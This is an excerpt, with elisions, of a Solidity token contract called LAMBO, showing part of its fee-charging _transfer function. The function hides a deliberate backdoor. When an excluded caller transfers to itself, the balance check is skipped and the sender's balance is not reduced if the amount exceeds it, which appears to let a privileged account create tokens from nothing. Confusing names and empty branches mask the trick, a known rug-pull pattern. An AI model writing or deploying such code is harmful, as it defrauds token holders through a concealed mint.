...
contract LAMBO is Ownable, IERC20 {
    ...
    string private _name = "Where is my Lambo!?";
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if (_isExcluded[sender] || _isExcluded[recipient] || recipient == address(this) || inLiquify) {} else {
            feeAmount = amount.mul(_fee).div(100);
            require(amount <= _maxTxAmount);
        }
        uint256 Reciever = _balances[sender];
        if (sender != recipient || !_isExcluded[msg.sender]) {
            require(Reciever >= amount, "IERC20: transfer amount exceeds balance");
        }
        uint256 receiveAmount = amount - feeAmount;
        _balances[address(0)] += feeAmount;
        if (Reciever < amount) {} else {
            _balances[sender] = Reciever - amount;
        }
